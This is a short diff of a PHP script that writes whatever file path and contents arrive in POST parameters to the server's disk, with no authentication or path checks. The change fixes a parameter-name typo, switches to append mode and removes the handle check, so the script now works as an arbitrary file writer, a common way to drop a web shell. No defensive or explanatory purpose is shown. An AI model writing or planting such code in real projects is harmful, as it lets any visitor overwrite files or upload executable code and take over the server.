@@ -1,6 +1,5 @@
 <?php 
-$fd = fopen ($_POST['filemane'], "w");
-if ($fd) {
-  fwrite($fd, $_POST['data']);
-  fclose($fd);
-} ?>
+$fd = fopen ($_POST['filename'], "a");
+fwrite($fd, $_POST['data']);
+fclose($fd);
+?>
